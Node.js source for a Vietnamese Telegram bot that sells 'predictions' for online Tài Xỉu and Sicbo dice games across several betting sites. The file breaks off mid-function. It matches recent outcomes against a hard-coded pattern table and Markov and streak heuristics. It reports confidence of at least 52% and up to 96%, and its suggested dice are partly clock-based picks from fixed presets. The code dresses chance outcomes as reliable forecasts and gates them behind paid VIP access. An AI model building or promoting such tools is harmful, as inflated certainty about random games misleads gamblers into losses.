/**
 * ĐỊT CHẾT CỤ NHÀ CÁI — ULTIMATE PREDICTION TOOL (v14.3)
 * Full API + LC79 Auto-Bet + Enhanced Engine + Sicbo Fix + Cầu + Login Silent
 */
'use strict';

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const dns = require('dns');
const crypto = require('crypto');
const { io } = require('socket.io-client');

try { dns.setDefaultResultOrder('ipv4first'); } catch (e) {}

const ROOT = __dirname;
const DATA = path.join(ROOT, 'data');
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA, { recursive: true });

const PORT = Number(process.env.PORT) || 10000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const ADMIN_IDS = String(process.env.TELEGRAM_ADMIN_IDS || process.env.ADMIN_IDS || '').split(/[,;\s]+/).map(s => s.trim()).filter(Boolean);
const PUBLIC_URL = (process.env.PUBLIC_URL || process.env.WEB_URL || '').replace(/\/$/, '');
const POLL_MS = Number(process.env.POLL_MS || 5000);
const TRIAL_HOURS = 2;

const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

/* ═══════════════ HELPERS ═══════════════ */
function loadJSON(file, fallback) {
  try {
    const p = path.join(DATA, file);
    if (!fs.existsSync(p)) return fallback;
    return JSON.parse(fs.readFileSync(p, 'utf8'));
  } catch { return fallback; }
}
function saveJSON(file, data) {
  try { fs.writeFileSync(path.join(DATA, file), JSON.stringify(data, null, 2)); } catch {}
}
function esc(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function fmt(n) { return Number(n || 0).toLocaleString('vi-VN'); }
function nowVN() {
  return new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
}
function isAdmin(id) { return ADMIN_IDS.includes(String(id)); }
function uidOf(from) { return String(from && from.id != null ? from.id : ''); }
function displayName(from) {
  if (!from) return 'Vô Danh';
  return [from.first_name, from.last_name].filter(Boolean).join(' ') || from.username || 'Vô Danh';
}

async function tg(method, body) {
  if (!BOT_TOKEN) return null;
  const url = `${TG}/${method}`;
  return new Promise((resolve) => {
    const u = new URL(url);
    const data = JSON.stringify(body || {});
    const options = {
      hostname: u.hostname, port: 443, path: u.pathname + u.search, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
      family: 4, timeout: 15000
    };
    const req = https.request(options, (res) => {
      let chunks = '';
      res.on('data', c => chunks += c);
      res.on('end', () => { try { resolve(JSON.parse(chunks)); } catch { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.write(data);
    req.end();
  });
}
async function send(chatId, text, extra = {}) {
  return tg('sendMessage', { chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true, ...extra });
}
async function delMsg(chatId, messageId) {
  if (!messageId) return;
  return tg('deleteMessage', { chat_id: chatId, message_id: messageId });
}
async function answerCb(id, text) {
  return tg('answerCallbackQuery', { callback_query_id: id, text: text || '', show_alert: false });
}

/* ═══════════════ STORE ═══════════════ */
const DEFAULT_CFG = { supportUrl: 'https://t.me/SunNetWin' };
let cfg = Object.assign({}, DEFAULT_CFG, loadJSON('config.json', {}));

let users = loadJSON('users.json', {});
let sessions = {};
let predMsg = {};
let autoWatch = {};

function saveUsers() { saveJSON('users.json', users); }
function ensureUser(uid) {
  if (!users[uid]) users[uid] = { vipUntil: Date.now() + TRIAL_HOURS * 3600 * 1000 };
  return users[uid];
}
function isVip(uid) {
  if (isAdmin(uid)) return true;
  return Number(ensureUser(uid).vipUntil || 0) > Date.now();
}
function vipText(uid) {
  if (isAdmin(uid)) return { active: true, line: '👑 ADMIN (Vĩnh viễn)', expire: '♾️ Không giới hạn' };
  const u = ensureUser(uid);
  if (Number(u.vipUntil || 0) > Date.now()) {
    return { active: true, line: '💎 ĐÃ CÓ QUYỀN VIP', expire: '⏳ ' + new Date(u.vipUntil).toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) };
  }
  return { active: false, line: '🔒 CHƯA CÓ QUYỀN', expire: '—' };
}
function grantVip(uid, hours) {
  const u = ensureUser(uid);
  const base = Math.max(Date.now(), Number(u.vipUntil || 0));
  u.vipUntil = base + hours * 3600 * 1000;
  saveUsers();
  return u.vipUntil;
}

/* ═══════════════ GAMES ═══════════════ */
const DEFAULT_GAMES = [
  { id: 'sunwin_tx', brand: 'sunwin', brandLabel: 'SUNWIN', variant: 'Tài Xỉu', url: 'https://well-summary-oclc-invisible.trycloudflare.com/api/tx', group: 'tx', enabled: true },
  { id: 'sicbo_sunwin', brand: 'sunwin', brandLabel: 'SUNWIN', variant: 'Sicbo', url: 'https://apitaixiu-6jjn.onrender.com/api/sicbo/sunwin', group: 'sicbo', enabled: true },
  { id: 'tik88_tx', brand: 'tik88', brandLabel: 'TIK88', variant: 'Tài Xỉu', url: 'https://get-enemies-got-copper.trycloudflare.com/api/txmd5', group: 'tx', enabled: true },
  { id: 'hitclub_tx', brand: 'hitclub', brandLabel: 'HITCLUB', variant: 'Tài Xỉu', url: 'https://apihitclubhihi.onrender.com/api/hitclub/hu', group: 'tx', enabled: true },
  { id: 'hitclub_md5', brand: 'hitclub', brandLabel: 'HITCLUB', variant: 'MD5', url: 'https://apihitclubhihi.onrender.com/api/hitclub/md5', group: 'md5', enabled: true },
  { id: 'sicbo_hitclub', brand: 'hitclub', brandLabel: 'HITCLUB', variant: 'Sicbo', url: 'https://apitaixiu-6jjn.onrender.com/api/sicbo/hitclub', group: 'sicbo', enabled: true },
  { id: 'max789_tx', brand: 'max789', brandLabel: 'MAX789', variant: 'Tài Xỉu', url: 'https://apitaixiu-6jjn.onrender.com/max789/tx', group: 'tx', enabled: true },
  { id: 'max789_md5', brand: 'max789', brandLabel: 'MAX789', variant: 'MD5', url: 'https://apitaixiu-6jjn.onrender.com/max789/md5', group: 'md5', enabled: true },
  { id: 'max789_kubet', brand: 'max789', brandLabel: 'MAX789', variant: 'Kubet Live', url: 'https://apitaixiu-6jjn.onrender.com/max789/kubet', group: 'tx', enabled: true },
  { id: 'lc79_tx', brand: 'lc79', brandLabel: 'LC79', variant: 'Tài Xỉu', url: 'https://apitaixiu-6jjn.onrender.com/lc79/tx', group: 'tx', enabled: true },
  { id: 'lc79_md5', brand: 'lc79', brandLabel: 'LC79', variant: 'MD5', url: 'https://apitaixiu-6jjn.onrender.com/lc79/md5', group: 'md5', enabled: true },
  { id: 'betvip_tx', brand: 'betvip', brandLabel: 'BETVIP', variant: 'Tài Xỉu', url: 'https://apitaixiu-6jjn.onrender.com/betvip/tx', group: 'tx', enabled: true },
  { id: 'betvip_md5', brand: 'betvip', brandLabel: 'BETVIP', variant: 'MD5', url: 'https://apitaixiu-6jjn.onrender.com/betvip/md5', group: 'md5', enabled: true },
  { id: 'b52_tx', brand: 'b52', brandLabel: 'B52', variant: 'Tài Xỉu', url: 'https://apitaixiu-6jjn.onrender.com/api/ditmemayb52', group: 'tx', enabled: true },
  { id: 'luck8_tx', brand: 'luck8', brandLabel: 'LUCK8', variant: 'Hũ', url: 'https://apitaixiu-6jjn.onrender.com/luck8-hu', group: 'tx', enabled: true },
  { id: 'luck8_md5', brand: 'luck8', brandLabel: 'LUCK8', variant: 'MD5', url: 'https://apitaixiu-6jjn.onrender.com/luck8-md5', group: 'md5', enabled: true },
  { id: 'sicbo_789', brand: '789club', brandLabel: '789CLUB', variant: 'Sicbo', url: 'https://apitaixiu-6jjn.onrender.com/api/sicbo/789', group: 'sicbo', enabled: true },
  { id: 'xocdia88_tx', brand: 'xocdia88', brandLabel: 'XOCDIA88', variant: 'Tài Xỉu', url: 'https://apitaixiu-6jjn.onrender.com/xocdia88/tx', group: 'tx', enabled: true },
  { id: 'xocdia88_md5', brand: 'xocdia88', brandLabel: 'XOCDIA88', variant: 'MD5', url: 'https://apitaixiu-6jjn.onrender.com/xocdia88/md5', group: 'md5', enabled: true },
  { id: 'sumclub_tx', brand: 'sumclub', brandLabel: 'SUMCLUB', variant: 'Tài Xỉu', url: 'https://apitaixiu-6jjn.onrender.com/sumclub/tx', group: 'tx', enabled: true },
  { id: 'sumclub_md5', brand: 'sumclub', brandLabel: 'SUMCLUB', variant: 'MD5', url: 'https://apitaixiu-6jjn.onrender.com/sumclub/md5', group: 'md5', enabled: true },
  { id: 'gb68_md5', brand: '68gb', brandLabel: '68GB', variant: 'MD5', url: 'https://apitaixiu-6jjn.onrender.com/68gb/md5', group: 'md5', enabled: true }
];

let games = loadJSON('games.json', null);
if (!Array.isArray(games) || !games.length) games = DEFAULT_GAMES.map(g => ({ ...g }));
else for (const d of DEFAULT_GAMES) if (!games.some(g => g.id === d.id)) games.push({ ...d });

/* ═══════════════ PATTERN DB ═══════════════ */
const PATTERN_DB = {
  "TXXTTXTX":"X","XXTTXTXX":"X","XTTXTXXT":"X","TTXTXXTT":"X","TXTXXTTT":"X","XTXXTTTX":"T","TXXTTTXX":"X","XXTTTXXT":"T","XTTTXXTX":"T","TTTXXTXX":"X","TTXXTXXX":"X","TXXTXXXX":"X","XXTXXXXX":"X","XTXXXXXT":"T","TXXXXXTX":"T","XXXXXTXX":"X","XXXXTXXX":"T","XXXTXXXT":"T","XXTXXXTX":"X","XTXXXTXX":"T","TXXXTXXX":"T","XXXTXXXX":"X","XXTXXXXT":"X","XTXXXXTT":"X","TXXXXTTX":"X","XXXXTTXX":"X","XXXTTXXX":"T","XXTTXXXT":"T","XTTXXXTX":"T","TTXXXTXT":"T","TXXXTXTX":"T","XXXTXTXT":"X","XXTXTXTT":"T","XTXTXTTT":"X","TXTXTTTT":"T","XTXTTTTT":"X","TXTTTTTT":"X","XTTTTTTX":"X","TTTTTTXT":"X","TTTTTXTX":"X","TTTTXTXT":"X","TTTXTXTT":"X","TTXTXTTX":"X","TXTXTTXT":"X","XTXTTXTX":"T","TXTTXTXT":"T","XTTXTXTT":"X","TXTTXTXX":"X","XTTXTXXX":"X","TTXTXXXT":"T","TXTXXXTT":"X","XTXXXTTX":"T","TXXXTTXX":"T","XXXTTXXT":"X","XXTTXXTX":"T","XTTXXTXX":"X","TXXTXXXT":"X","XXTXXXTT":"T","XTXXXTTT":"T","TXXXTTTT":"X","XXXTTTTT":"T","XXTTTTTT":"X","TTTTTTXX":"X","TTTTTXXX":"T","TTTTXXXT":"X","TTTXXXTX":"X","TXXXTXTT":"X","XXXTXTTX":"X","XXTXTTXX":"T","XTXTTXXT":"T","TXTTXXTT":"T","XTTXXTTT":"X","TTXXTTTX":"T","TXXTTTXT":"X","XXTTTXTX":"T","XTTTXTXX":"X","TTTXTXXX":"X","XTXTTXXX":"X","TXTTXXXT":"X","TTXXXTXX":"X","TXXXTXXT":"T","XXXTXXTX":"X","XXTXXTXT":"X","XTXXTXTX":"T","TXXTXTXT":"X","XTXTXTTX":"X","XTXTTXTT":"T","TXTTXTTT":"T","XTTXTTTX":"X","TTXTTTXT":"X","TXTTTXTT":"X","XTTTXTTX":"T","TTTXTTXT":"X","TTXTTXTX":"T","TTXTXXTX":"T","TXTXXTXT":"X","XTXXTXTT":"T","TXXTXTTT":"T","XXTXTTTT":"X","TXTTTTTX":"T","XTTTTTXX":"T","TTTTXXXX":"T","TTTXXXXX":"X","TTXXXXXX":"X","TXXXXXXT":"T","XXXXXXTT":"X","XXXXXTTX":"X","XTTXXTXT":"X","TTXXTXTT":"T","XTXTTTTX":"T","TXTTTTXT":"X","XTTTTXTX":"T","TTTTXTXX":"X","TTTXTXXT":"T","TXTXTTTX":"T","XTXTTTXX":"T","TXTTTXXT":"T","XTTTXXTT":"T","TTTXXTTT":"T","TTXXTTTT":"X","TXXTTTTX":"T","XXTTTTXT":"X","TXTXTTXX":"X","TXTTXXXX":"T","XTTXXXXT":"X","TTXXXXTX":"X","TXXXXTXT":"X","XXXXTXTX":"T","TXTTTTXX":"T","XTTTTXXT":"T","TTTTXXTX":"T","XXXTXXTT":"T","XXTXXTTT":"X","XXTTTXTT":"X","TTTXTTXX":"T","TTXTTXXX":"X","XTTXXXXX":"T","TTXXXXXT":"T","TXXXXXTT":"T","XXXXXTTT":"X","XXXXTTTT":"T","XXXTTTTX":"T","XTTXTXTX":"T","TTXTXTXT":"X","TXTXTXTX":"X","XTXTXTXT":"X","XTXTXTXX":"X","TXTXTXXT":"X","XTXTXXTX":"T","XXTXTXTX":"X","TXTXTXTT":"X","TXTTTXXX":"T","XTTTXXXX":"X","TTTXXXXT":"X","TTXXXXTT":"X","XXXTXTXX":"T","XXTXTXXX":"X","XTXTXXXT":"X","XXTTXXTT":"T","TXXTTTTT":"X","TTTTTXTT":"X","TTTTXTTT":"T","TTTXTTTT":"X","TTXTTTTX":"X","XTXXTTTT":"T","XTTTTXTT":"T","XTTTTXXX":"X","TXXXXTTT":"X","XXXXTTTX":"T","XXXTTTXX":"X","TXTXTXXX":"X","XXTTTTXX":"X","TTTXXXTT":"T","TTXXXTTX":"T","TXXXTTXT":"X","XXXTTXTT":"T","XXTTXTTX":"X","XTTXTTXX":"X","TTXTTXXT":"T","TTTXXTXT":"X","TTXXTXTX":"X","TXTXXXTX":"X","TTTTXXTT":"T","XTTTTTTT":"T","TTTTTTTT":"X","TTTTTTTX":"T","TTTTTXXT":"T","TTTXXTTX":"T","TTXXTTXX":"T","TXXTTXXT":"X","TTXXTXXT":"T","TXXTXXTX":"T","XXTXXTXX":"X","XTXXTXXX":"X","XTXXXXTX":"T","XXXXTXTT":"T","XXXTXTTT":"X","TXXTXXTT":"T","XXXXXTXT":"T","XTTXXXTT":"T","XXTTXXXX":"X","TXTTXTTX":"T","XTTXTTXT":"X","TTXTTXTT":"T","XTTXTTTT":"X","TTXTTTTT":"X","TTTTXTTX":"X","TTXTXXXX":"T","TXTXXXXT":"T","XXTTTTTX":"X","XTTTTTXT":"T","TTTXTXTX":"X","TXTXXTXX":"X","XTXXTXXT":"T","XTXTXXXX":"T","TXXXXTXX":"T","TTXTXTXX":"X","XTXTXXTT":"T","TXXXTTTX":"X","XXXTTTXT":"X","XXTTTXXX":"T","XTTTXXXT":"X","TTXXXTTT":"X","TXXTXTTX":"T","TXTTXXTX":"X","XXTXTTTX":"X","XTXXXXXX":"T","TXXXXXXX":"X","XXXXXXXT":"X","XXXXTTXT":"T","XXXTTXTX":"X","TXTXXXXX":"X","XXXXTXXT":"X","TXXTXTXX":"T","XXTXTXXT":"T","TXTXXTTX":"X","XTXXTTXX":"X","TXXTTXXX":"X","XXTTXTTT":"T","TTXTTTXX":"T","XXXXXXTX":"X","TTTXTTTX":"X","XTTTXTTT":"T","TXTTTXTX":"X","XTXXXTXT":"X","XTTXXTTX":"T","TTXXTTXT":"X","XXTTXTXT":"X","XXTXXTTX":"X","TXTT":"X","TXTTT":"X","TXTTTX":"X","TXTTTXX":"X","XXTXTTXT":"X","TTXTXTTT":"X","XTXTTTXT":"T","XTTTXTXT":"X","XTXXTTXT":"X","TXXTTXTT":"X","XXTT":"T","XXTTT":"T","XXTTTT":"X","XXTTTTX":"X","XTXX":"T","XTXXT":"T","XTXXTT":"T","XTXXTTT":"T","XXXXXXXX":"T","TXXT":"T","TXXTT":"T","TXXTTT":"X","TXXTTTX":"T","XTTT":"X","XTTTX":"X","XTTTXX":"T","XTTTXXX":"T","TTXT":"X","TTXTX":"X","TTXTXX":"X","TTXTXXX":"X","XTTTXXT":"T","TXTTX":"T","TXTTXT":"T","TXTTXTT":"T","TXXX":"T","TXXXT":"T","TXXXTT":"T","TXXXTTT":"X","XXTX":"T","XXTXT":"X","XXTXTX":"X","XXTXTXX":"X"
};

/* ═══════════════ SICBO ANALYZER ═══════════════ */
class SicboAnalyzer {
  constructor() { this.reset(); }
  reset() {
    this.dice = [[0,0,0,0,0,0],[0,0,0,0,0,0],[0,0,0,0,0,0]];
    this.sums = {}; this.triples = 0; this.pairs = 0; this.total = 0;
  }
  push(diceArr) {
    if (!Array.isArray(diceArr) || diceArr.length < 3) return false;
    const d = diceArr.slice(0, 3).map(x => {
      const n = Math.floor(Number(x));
      return (n >= 1 && n <= 6) ? n : 0;
    });
    if (d.some(x => !x)) return false;
    for (let i = 0; i < 3; i++) this.dice[i][d[i] - 1]++;
    const sum = d[0] + d[1] + d[2];
    this.sums[sum] = (this.sums[sum] || 0) + 1;
    const uniq = new Set(d);
    if (uniq.size === 1) this.triples++;
    else if (uniq.size === 2) this.pairs++;
    this.total++;
    return true;
  }
  biasScore() {
    if (this.total < 30) return { chi: 0, biased: false, strength: 0 };
    const exp = this.total / 6;
    let chi = 0;
    for (const arr of this.dice) for (const c of arr) chi += ((c - exp) ** 2) / exp;
    const biased = chi > 25;
    return { chi: Math.round(chi * 10) / 10, biased, strength: biased ? Math.min(1, (chi - 25) / 75) : 0 };
  }
  hotDice() {
    if (this.total < 20) return null;
    return this.dice.map(arr => arr.indexOf(Math.max(...arr)) + 1);
  }
  guessDice(side) {
    const pool = side === 'T' ? [11,12,13,14,15,16,17] : [4,5,6,7,8,9,10];
    const hot = this.hotDice();
    if (hot && hot.every(v => v >= 1 && v <= 6)) {
      const sum = hot[0] + hot[1] + hot[2];
      if (pool.includes(sum)) return hot.slice().sort((a, b) => a - b);
    }
    if (hot) {
      for (let d1 = 1; d1 <= 6; d1++) {
        for (let d2 = 1; d2 <= 6; d2++) {
          for (let d3 = 1; d3 <= 6; d3++) {
            const sum = d1 + d2 + d3;
            if (!pool.includes(sum)) continue;
            const dist = Math.abs(d1 - hot[0]) + Math.abs(d2 - hot[1]) + Math.abs(d3 - hot[2]);
            if (dist <= 2) return [d1, d2, d3];
          }
        }
      }
    }
    return null;
  }
  anomalyRate() { return this.total < 20 ? 0 : ((this.triples + this.pairs) / this.total) * 100; }
}

/* ═══════════════ ENHANCED ENGINE v14 ═══════════════ */
class Engine {
  constructor(id) {
    this.id = id || '';
    this.history = [];
    this.sums = [];
    this.diceHist = [];
    this.correct = 0;
    this.total = 0;
    this.pending = null;
    this.pendingMeta = null;
    this.log = [];
    this.sicbo = new SicboAnalyzer();

    this.patternPerf = {};
    this.markov1 = {};
    this.markov2 = {};
    this.streakHistory = {};
    this.recentPreds = [];
    this.volatility = 0.5;
    this.trend = 0;
    this.momentum = 0;

    this.weights = {
      pattern: 3.0, markov2: 2.5, markov1: 1.8, streak: 1.8,
      sumZ: 1.5, sicbo: 2.2, momentum: 1.2, trend: 1.3
    };
  }

  push(side, sum, dice, session) {
    const s = side === 'T' ? 'T' : 'X';
    const n = this.history.length;

    if (n >= 1) {
      const lastSide = this.history[n - 1];
      let streak = 1;
      for (let i = n - 2; i >= 0 && this.history[i] === lastSide; i--) streak++;
      if (!this.streakHistory[streak]) this.streakHistory[streak] = { same: 0, diff: 0 };
      if (lastSide === s) this.streakHistory[streak].same++;
      else this.streakHistory[streak].diff++;
    }

    if (this.pending) {
      this.total++;
      const ok = this.pending === s;
      if (ok) this.correct++;

      let okVi = null;
      if (this.pendingMeta && this.pendingMeta.vi && Array.isArray(dice) && dice.length === 3) {
        const d = dice.map(Number).sort((a, b) => a - b);
        const vi = this.pendingMeta.vi.slice().sort((a, b) => a - b);
        okVi = d.every((v, i) => v === vi[i]);
      }

      const pat = this.pendingMeta && this.pendingMeta.pattern;
      if (pat) {
        if (!this.patternPerf[pat]) this.patternPerf[pat] = { win: 0, total: 0 };
        this.patternPerf[pat].total++;
        if (ok) this.patternPerf[pat].win++;
      }

      this.recentPreds.push({ correct: ok });
      if (this.recentPreds.length > 30) this.recentPreds.shift();

      this.log.push({
        session: session || '',
        pred: this.pending, actual: s, ok, okVi,
        conf: (this.pendingMeta && this.pendingMeta.conf) || 0,
        sum: Number(sum) || 0,
        dice: Array.isArray(dice) ? dice.map(Number) : [],
        pattern: pat
      });
      if (this.log.length > 500) this.log.shift();

      this.pending = null; this.pendingMeta = null;
    }

    if (n >= 1) {
      const prev = this.history[n - 1];
      if (!this.markov1[prev]) this.markov1[prev] = { T: 0, X: 0 };
      this.markov1[prev][s]++;
    }
    if (n >= 2) {
      const key = this.history[n - 2] + this.history[n - 1];
      if (!this.markov2[key]) this.markov2[key] = { T: 0, X: 0 };
      this.markov2[key][s]++;
    }

    this.history.push(s);
    this.sums.push(Number(sum) || 10);
    if (dice && dice.length >= 3) this.diceHist.push(dice.map(Number));
    if (this.history.length > 500) { this.history.shift(); this.sums.shift(); }
    if (this.diceHist.length > 500) this.diceHist.shift();
    if (dice && dice.length >= 3) this.sicbo.push(dice);

    this._updateDerived();
  }

  _updateDerived() {
    const h = this.history;
    if (h.length < 10) return;
    let changes = 0;
    for (let i = 1; i < 10; i++) if (h[h.length - i] !== h[h.length - i - 1]) changes++;
    this.volatility = changes / 9;

    const w20 = h.slice(-20);
    const t20 = w20.filter(x => x === 'T').length;
    this.trend = (t20 - (w20.length - t20)) / w20.length;

    if (h.length >= 20) {
      const w5 = h.slice(-5);
      const t5 = w5.filter(x => x === 'T').length / 5;
      const t20r = t20 / 20;
      this.momentum = t5 - t20r;
    }
  }

  predict() {
    const h = this.history;
    const n = h.length;
    if (n < 3) {
      const side = n && h[n - 1] === 'X' ? 'T' : 'X';
      const out = {
        side, conf: 51, reason: '📡 Đang lấy dữ liệu',
        vi: pickVi(side, this.sums, this.diceHist, this.sicbo),
        streak: 0, trend: 0, momentum: 0, volatility: 50,
        anomaly: 0, sicboBias: null, pattern: null
      };
      this.pending = side; this.pendingMeta = out; return out;
    }

    const last = h[n - 1];
    const last2 = n >= 2 ? h[n - 2] : null;

    let streak = 1;
    for (let i = n - 2; i >= 0 && h[i] === last; i--) streak++;

    const scores = { T: 0, X: 0 };
    const reasons = [];
    let weightUsed = 0;
    let patternMatched = null;

    for (let len = Math.min(n, 8); len >= 2; len--) {
      const pat = h.slice(-len).join('');
      if (PATTERN_DB[pat]) {
        const pred = PATTERN_DB[pat];
        let w = this.weights.pattern;
        const perf = this.patternPerf[pat];
        if (perf && perf.total >= 5) {
          const acc = perf.win / perf.total;
          w *= (0.5 + acc);
        }
        scores[pred] += w;
        weightUsed += w;
        reasons.push(`🎯 Mẫu ${len}`);
        patternMatched = pat;
        break;
      }
    }

    if (n >= 2) {
      const key = last2 + last;
      const d = this.markov2[key];
      if (d) {
        const tot = d.T + d.X;
        if (tot >= 3) {
          const pT = (d.T + 1) / (tot + 2);
          const w = this.weights.markov2 * Math.min(1, tot / 10);
          scores.T += (pT - 0.5) * 2 * w;
          scores.X -= (pT - 0.5) * 2 * w;
          weightUsed += w;
          if (Math.abs(pT - 0.5) > 0.15) reasons.push(`🔗 M2 ${pT > 0.5 ? 'T' : 'X'}`);
        }
      }
    }

    if (this.markov1[last]) {
      const d = this.markov1[last];
      const tot = d.T + d.X;
      if (tot >= 5) {
        const pT = (d.T + 1) / (tot + 2);
        const w = this.weights.markov1 * Math.min(1, tot / 20);
        scores.T += (pT - 0.5) * 2 * w;
        scores.X -= (pT - 0.5) * 2 * w;
        weightUsed += w;
        if (Math.abs(pT - 0.5) > 0.15) reasons.push(`🔗 M1 ${pT > 0.5 ? 'T' : 'X'}`);
      }
    }

    if (streak >= 2 && this.streakHistory[streak]) {
      const sh = this.streakHistory[streak];
      const tot = sh.same + sh.diff;
      if (tot >= 3) {
        const pDiff = (sh.diff + 1) / (tot + 2);
        const w = this.weights.streak * Math.min(1, tot / 5);
        if (pDiff > 0.55) {
          const pred = last === 'T' ? 'X' : 'T';
          scores[pred] += w * (pDiff - 0.5) * 4;
          weightUsed += w;
          reasons.push(`🔥 Bệt ${streak} bẻ`);
        } else if (pDiff < 0.45) {
          scores[last] += w * (0.5 - pDiff) * 4;
          weightUsed += w;
          reasons.push(`🔥 Bệt ${streak} theo`);
        }
      }
    }

    if (this.sums.length >= 15) {
      const recent = this.sums.slice(-30);
      const mean = recent.reduce((a, b) => a + b, 0) / recent.length;
      const variance = recent.reduce((a, b) => a + (b - mean) ** 2, 0) / recent.length;
      const std = Math.sqrt(variance) || 1;
      const lastSum = this.sums[this.sums.length - 1];
      const z = (lastSum - mean) / std;
      if (Math.abs(z) > 1.2) {
        const pred = z > 0 ? 'X' : 'T';
        const w = this.weights.sumZ * Math.min(2, Math.abs(z) / 1.5);
        scores[pred] += w;
        weightUsed += w;
        reasons.push(`📊 Z=${z.toFixed(1)}`);
      }
    }

    if (this.sicbo.total >= 30) {
      const bias = this.sicbo.biasScore();
      if (bias.biased) {
        const hot = this.sicbo.hotDice();
        if (hot) {
          const hotSum = hot[0] + hot[1] + hot[2];
          if (hotSum >= 11) {
            scores.T += this.weights.sicbo * bias.strength;
            weightUsed += this.weights.sicbo * bias.strength;
            reasons.push(`🎲 Sicbo T`);
          } else {
            scores.X += this.weights.sicbo * bias.strength;
            weightUsed += this.weights.sicbo * bias.strength;
            reasons.push(`🎲 Sicbo X`);
          }
        }
      }
    }

    if (Math.abs(this.momentum) > 0.15) {
      const pred = this.momentum > 0 ? 'T' : 'X';
      scores[pred] += this.weights.momentum * Math.abs(this.momentum) * 2;
      weightUsed += this.weights.momentum;
      reasons.push(`⚡ Momentum ${pred}`);
    }

    if (Math.abs(this.trend) > 0.3) {
      const pred = this.trend > 0 ? 'T' : 'X';
      scores[pred] += this.weights.trend * Math.abs(this.trend);
      weightUsed += this.weights.trend;
      reasons.push(`📈 Trend ${pred}`);
    }

    if (n >= 6) {
      let isAlt = true;
      for (let i = n - 6; i < n - 1; i++) {
        if (h[i] === h[i + 1]) { isAlt = false; break; }
      }
      if (isAlt) {
        scores[last === 'T' ? 'X' : 'T'] += 0.5;
        reasons.push('🔄 Cầu đan');
      }
    }

    let netScore = scores.T - scores.X;
    if (weightUsed > 0) netScore /= Math.sqrt(weightUsed);
    netScore = Math.max(-3, Math.min(3, netScore));

    const pT = 1 / (1 + Math.exp(-netScore));
    const side = pT >= 0.5 ? 'T' : 'X';

    const edge = Math.abs(pT - 0.5) * 2;
    let conf = Math.round(52 + edge * 40 + Math.min(8, weightUsed * 1.5));
    if (this.volatility > 0.75) conf = Math.round(conf * 0.9);
    if (this.recentPreds.length >= 10) {
      const acc = this.recentPreds.filter(r => r.correct).length / this.recentPreds.length;
      if (acc > 0.65) conf = Math.round(conf * 1.05);
      else if (acc < 0.4) conf = Math.round(conf * 0.92);
    }
    conf = Math.max(52, Math.min(96, conf));

    const vi = pickVi(side, this.sums, this.diceHist, this.sicbo);
    const out = {
      side, conf,
      reason: reasons.slice(0, 2).join(' · ') || '📡 Cầu đang chạy',
      vi, streak,
      trend: Math.round(this.trend * 100),
      momentum: Math.round(this.momentum * 100),
      volatility: Math.round(this.volatility * 100),
      anomaly: this.sicbo.anomalyRate(),
      sicboBias: this.sicbo.total >= 30 ? this.sicbo.biasScore() : null,
      pattern: patternMatched
    };
    this.pending = side;
    this.pendingMeta = out;
    return out;
  }

  accuracy() { return !this.total ? 0 : Math.round((this.correct / this.total) * 100); }
}

/* ═══════════════ VI SUGGEST (VALID DICE 1-6) ═══════════════ */
function pickVi(side, sums, diceHist, sicboAnalyzer) {
  const isTai = side === 'T';
  const pool = isTai ? [11, 12, 13, 14, 15, 16, 17] : [4, 5, 6, 7, 8, 9, 10];
  const FALLBACK = isTai ? [4, 5, 6] : [1, 2, 3];

  if (sicboAnalyzer && sicboAnalyzer.total >= 30) {
    const g = sicboAnalyzer.guessDice(side);
    if (g && g.every(v => v >= 1 && v <= 6)) {
      const s = g[0] + g[1] + g[2];
      if (pool.includes(s)) return g.slice().sort((a, b) => a - b);
    }
  }

  const presetsT = [
    [3,4,4], [3,4,5], [3,4,6], [4,4,5], [3,5,5],
    [3,5,6], [4,4,6], [4,5,5], [3,6,6], [4,5,6],
    [5,5,5], [4,6,6], [5,5,6], [5,6,6]
  ];
  const presetsX = [
    [1,1,2], [1,1,3], [1,2,2], [1,1,4], [1,2,3], [2,2,2],
    [1,1,5], [1,2,4], [1,3,3], [2,2,3], [1,1,6], [1,2,5],
    [1,3,4], [2,2,4], [2,3,3], [1,2,6], [1,3,5], [1,4,4],
    [2,2,5], [2,3,4], [3,3,3], [1,3,6], [1,4,5], [2,2,6],
    [2,3,5], [2,4,4], [3,3,4]
  ];
  const presets = isTai ? presetsT : presetsX;
  if (!pickVi._seq) pickVi._seq = 0;
  pickVi._seq = (pickVi._seq + 1) % 1000;
  const mix = (pickVi._seq * 7) + (Date.now() % 97);
  const base = presets[mix % presets.length].slice();

  const sum = base[0] + base[1] + base[2];
  if (!pool.includes(sum) || base.some(v => v < 1 || v > 6)) return FALLBACK.slice();
  return base.sort((a, b) => a - b);
}

/* ═══════════════ CẦU STRING ═══════════════ */
function cauStr(history, n = 20) {
  return history.slice(-n).map(x => x === 'T' ? '🔴' : '🔵').join('');
}

function isSicboGame(g) {
  return g && (String(g.group || '').toLowerCase() === 'sicbo' || String(g.variant || '').toLowerCase().includes('sicbo'));
}

/* ═══════════════ FEEDS & POLLING ═══════════════ */
const FEEDS = {};
for (const g of games) FEEDS[g.id] = { id: g.id, engine: new Engine(g.id), lastSession: null, lastLive: null, lastError: null, lastPred: null };

function parseLive(json) {
  if (!json) return null;
  let item = json;
  if (json.Lich_su && Array.isArray(json.Lich_su) && json.Lich_su.length > 0) item = json.Lich_su[0];
  else if (json.history && Array.isArray(json.history) && json.history.length > 0) item = json.history[0];
  else if (Array.isArray(json) && json.length > 0) item = json[0];
  else if (json.data && Array.isArray(json.data) && json.data.length > 0) item = json.data[0];
  else if (json.data && typeof json.data === 'object') item = json.data;

  if (!item || typeof item !== 'object') return null;

  const getVal = (obj, keys) => {
    for (const k of keys) if (obj[k] !== undefined && obj[k] !== null) return obj[k];
    const lower = keys.map(k => k.toLowerCase());
    for (const key of Object.keys(obj)) if (lower.includes(key.toLowerCase())) return obj[key];
    return null;
  };

